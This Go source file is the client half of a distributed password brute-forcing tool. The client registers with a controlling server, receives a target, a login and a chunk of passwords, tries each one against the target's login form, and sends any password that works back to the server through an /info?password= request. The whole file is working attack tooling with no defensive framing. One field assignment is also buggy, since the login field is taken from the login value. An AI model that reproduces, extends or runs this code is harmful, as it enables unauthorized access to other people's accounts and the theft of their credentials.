package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

type ServerRequest struct {
	Connection_count int
	Password_list    []string
	Attack           bool
	Target           string
	Request_type     string
	Login            string
	Stop             string
	Login_field      string
	Password_field   string
}

var chunk []string

func client_mode(address string) {
	if address == "none" {
		fmt.Println("Parameter address (--address) not found")
		return
	}
	defer func() {
		_, err := http.Get(address + "/unjoined")
		if err != nil {
			fmt.Println("Can't connect server for unjoined request")
			return
		}
	}()
	_, err := http.Get(address + "/joined")
	if err != nil {
		fmt.Println("Server not active or address not connect")
		fmt.Println(err)
	}
	var connects = -1
	var requestType string
	for {
		response, err := http.Get(address + "/status?connect_count=" + fmt.Sprintf("%d", connects))
		if err != nil {
			fmt.Println("Can't getting status server info")
			break
		}
		body, err := ioutil.ReadAll(response.Body)
		if len(body) <= 2 || err != nil {
			time.Sleep(time.Second * 2)
			continue
		}
		var data ServerRequest
		json.Unmarshal(body, &data)
		connects = data.Connection_count
		target := data.Target
		login := data.Login
		loginField := data.Login
		passwordField := data.Password_field
		stop := data.Stop
		requestType = data.Request_type
		if data.Attack {
			for _, password := range chunk {
				result := bruteforce(target, requestType, login, password, loginField, passwordField, stop)
				if result != "" {
					fmt.Println(result)
					http.Get(address + "/info?password=" + result)
				}
			}
			break
		}
		if len(data.Password_list) == 0 {
			continue
		}
		chunk = data.Password_list
		fmt.Println("Getting data, size:", len(chunk))
		time.Sleep(time.Second * 2)
	}
	return
}
